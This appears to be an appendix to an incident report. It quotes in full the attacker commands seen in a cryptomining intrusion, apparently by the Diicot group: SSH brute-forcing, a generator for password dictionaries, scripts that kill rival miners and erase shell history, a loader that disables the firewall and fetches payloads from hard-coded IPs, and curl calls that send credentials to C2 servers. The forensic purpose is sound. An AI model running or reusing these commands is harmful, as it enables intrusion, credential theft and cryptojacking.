# Observed Commands

This document contains full versions of commands observed during the post-incident analysis.  
Each command is linked from the findings sections for clarity and deeper technical context.

---

# Initial Threat Hunt Observations

---

## .bisis SSH Brute-Force Command
(id: `bisis-ssh-brute-force-command`)

```bash
/var/tmp/.update-logs/./.bisis ssh \
  -o /var/tmp/.update-logs/data.json \
  --userauth none \
  --timeout 8
```

**Description:**  
Hidden binary `.bisis` executing SSH brute-force attempts against target systems.  
Uses a timeout of 8 seconds per connection attempt and references an external configuration file (`data.json`).

---

## .bisis Repeated Execution Command
(id: `bisis-repeated-execution-command`)

```bash
bash -c "
cd /var/tmp/.update-logs ; \
chmod +x /var/tmp/.update-logs/.bisis ; \
ulimit -n 999999 ; \
cat iplist | ./bisis -f 20 -t 8 -T 20 -S 10 -p 22 -l root \
  -o /var/tmp/.update-logs/.history \
  -O /var/tmp/.update-logs/.history \
  -i eth0 \
  -d /var/tmp/.update-logs/iplist2 ; \
./x"
```

**Description:**  
Launches `.bisis` with customized parameters (threads, timeout, SSH port, username) and starts a second payload (`x`) after brute-forcing.

---

## ./network Multi-Stage Crypto Mining Script
(id: `network-multistage-script`)

```bash
./network "rm -rf /var/tmp/Documents ; \
mkdir /var/tmp/Documents 2>&1 ; \
crontab -r ; \
chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; \
cd /var/tmp ; \
chattr -iae /var/tmp/Documents/.diicot ; \
pkill Opera ; pkill cnrig ; pkill java ; killall java ; \
pkill xmrig ; killall cnrig ; killall xmrig ; \
cd /var/tmp/ ; \
mv /var/tmp/diicot /var/tmp/Documents/.diicot ; \
mv /var/tmp/kuak /var/tmp/Documents/kuak ; \
cd /var/tmp/Documents ; \
chmod +x .* ; \
/var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; \
history -c ; \
rm -rf .bash_history ~/.bash_history ; \
rm -rf /tmp/cache ; \
cd /tmp/ ; \
wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; \
mv .balu cache ; \
chmod +x cache ; \
./cache >/dev/null 2>&1 & disown ; \
history -c ; \
rm -rf .bash_history ~/.bash_history"
```

**Description:**  
Complex script to eliminate competition, hide traces, deploy mining payloads, and set persistence through hidden directories.

---

## ./retea Full Payload Script
(id: `retea-full-payload-script`)

```bash
./retea -c '
key=$1
user=$2

if [[ $key == "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]]
then
  echo -e ""
else
  echo Logged with successfully.
  rm -rf .retea 
  crontab -r ; pkill xrx ; pkill haiduc ; pkill blacku ; pkill xMEu
  cd /var/tmp
  rm -rf /dev/shm/.x /var/tmp/.update-logs /var/tmp/Documents /tmp/.tmp
  mkdir /tmp/.tmp
  pkill Opera
  rm -rf xmrig .diicot .black Opera .black xmrig.1
  pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig
  wget -q dinpasiune.com/payload || curl -O -s -L dinpasiune.com/payload || wget 85.31.47.99/payload || curl -O -s -L 85.31.47.99/payload
  chmod +x *
  ./payload >/dev/null 2>&1 & disown
  history -c
  rm -rf .bash_history ~/.bash_history
  chmod +x .teaca
  ./.teaca > /dev/null 2>&1
  history -c
  rm -rf .bash_history ~/.bash_history
fi

rm -rf /etc/sysctl.conf
echo "fs.file-max = 2097152" > /etc/sysctl.conf
sysctl -p
ulimit -Hn
ulimit -n 99999 -u 999999

cd /dev/shm
mkdir /dev/shm/.x > /dev/null 2>&1
mv network .x/
cd .x
rm -rf retea ips iptemp iplist
sleep 1
rm -rf pass

useri=`cat /etc/passwd | grep -v nologin | grep -v false | grep -v sync | grep -v halt | grep -v shutdown | cut -d: -f1`
echo $useri > .usrs
pasus=.usrs
check=`grep -c . .usrs`

for us in $(cat $pasus); do
  printf "$us $us\\n" >> pass
  printf "$us ${us}$us\\n" >> pass
  printf "$us ${us}123\\n" >> pass
  printf "$us ${us}123456\\n" >> pass
  printf "$us 123456\\n" >> pass
  printf "$us 1\\n" >> pass
  printf "$us 12\\n" >> pass
  printf "$us 123\\n" >> pass
  printf "$us 1234\\n" >> pass
  printf "$us 12345\\n" >> pass
  printf "$us 12345678\\n" >> pass
  printf "$us 123456789\\n" >> pass
  printf "$us 123.com\\n" >> pass
  printf "$us 123456.com\\n" >> pass
  printf "$us 123\\n" >> pass
  printf "$us 1qaz@WSX\\n" >> pass
  printf "$us ${us}@123\\n" >> pass
  printf "$us ${us}@1234\\n" >> pass
  printf "$us ${us}@123456\\n" >> pass
  printf "$us ${us}123\\n" >> pass
  printf "$us ${us}1234\\n" >> pass
  printf "$us ${us}123456\\n" >> pass
  printf "$us qwer1234\\n" >> pass
  printf "$us 111111\\n" >> pass
  printf "$us Passw0rd\\n" >> pass
  printf "$us P@ssw0rd\\n" >> pass
  printf "$us qaz123!@#\\n" >> pass
  printf "$us !@#\\n" >> pass
  printf "$us password\\n" >> pass
  printf "$us Huawei@123\\n" >> pass
done

wait
sleep 0.5
cat bios.txt | sort -R | uniq > i
cat i > bios.txt

./network "... (same full command as earlier) ..."
sleep 25

function Miner {
  rm -rf /dev/shm/retea /dev/shm/.magic
  rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot
  rm -rf ~/.bash_history
  history -c
}
Miner
' ./retea KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU Haceru
```

**Description:**  
Malicious script associated with the Diicot group; collects system info, builds credential dictionaries, wipes traces, downloads and executes secondary payloads.

---

## ./UpzBUBnv Suspicious Binary Execution
```bash
./UpzBUBnv
```

## ./cache Crypto Miner Execution
```bash
./cache
```

## curl Silent Data Exfiltration to C2
```bash
curl --silent "http://196.251.73.38:47/save-data?IP=45.64.186.20" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" \
  --insecure
```

**Description:**  
Silent HTTP request to a C2 server transmitting the victim system’s IP. Uses `--silent` and browser-like headers to mimic legitimate traffic and evade detection; `--insecure` bypasses certificate validation.

---

## bash-based Firewall Disabling and Malware Loader
```bash
bash -c "
  pkill firewalld -9;
  pkill iptables -9;
  ulimit -e 999999;
  ulimit -u 999999;
  ulimit -n 999999;
  cd /tmp || cd /run || cd /;
  rm -rf logsbins.sh;
  wget http://194.32.145.243/logsbins.sh;
  chmod 777 logsbins.sh;
  sh logsbins.sh;
  curl -o logsbins.sh http://194.32.145.243/logsbins.sh;
  chmod 777 logsbins.sh;
  sh logsbins.sh;
  tftp 194.32.145.243 -c get logstftp1.sh;
  chmod 777 logstftp1.sh;
  sh logstftp1.sh;
  tftp -r logstftp2.sh -g 194.32.145.243;
  chmod 777 logstftp2.sh;
  sh logstftp2.sh;
  rm -rf logsbins.sh logstftp1.sh logstftp2.sh;
  rm -rf *;
  cd;
  rm -rf .bash_history;
  history -c
"
```

**Description:**  
Heavily obfuscated loader script that disables firewalls, removes logs, and fetches payloads via HTTP and TFTP. It aggressively wipes shell history and artifacts to maximize stealth.

---

## curl Credential and System Info Exfiltration
```bash
curl --silent "http://87.120.116.35:8000/save-data?IP=54.177.195.166&USER=user1&PASS=*****&PORT=22" \
  --insecure
```

**Description:**  
Sensitive data—IP, username, password, and SSH port—is exfiltrated over unencrypted HTTP. The `--silent` and `--insecure` flags suppress output and bypass TLS checks to evade detection.









